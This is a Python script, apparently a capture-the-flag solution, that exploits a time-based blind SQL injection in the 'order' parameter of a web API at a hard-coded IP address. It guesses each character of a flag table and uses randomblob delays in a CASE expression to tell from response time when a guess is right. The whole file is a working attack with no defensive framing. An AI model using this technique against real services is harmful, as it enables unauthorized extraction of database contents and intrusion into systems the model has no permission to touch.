import requests

final = ""

for x in range(len(final), 100):
    for y in range(0x20, 0x80): # for every x position, try the character y (0x20 - 0x7e are the "characters" in the ASCII table)
        if y == 0x7f:
            print("done!")
            __import__("sys").exit()
        
        y = chr(y)

        # x is the position, and y is the character
        sqli = f"(SELECT CASE WHEN substr(flag, {x+1}, 1) == '{y}' THEN randomblob(2000000) ELSE 'Yes' END FROM flag_efaf0a5343) DESC;" # i got the table name by running the script earlier and reading name from sqlite_master
        res_time = requests.post("http://188.166.172.13:31026/api/list", json={"order": sqli}).elapsed.total_seconds()

        if res_time > 0.5: # if the request takes longer than 0.5 seconds, randomblob(2000000) was ran, which means we have the correct character
            final += y
            break
    print(final)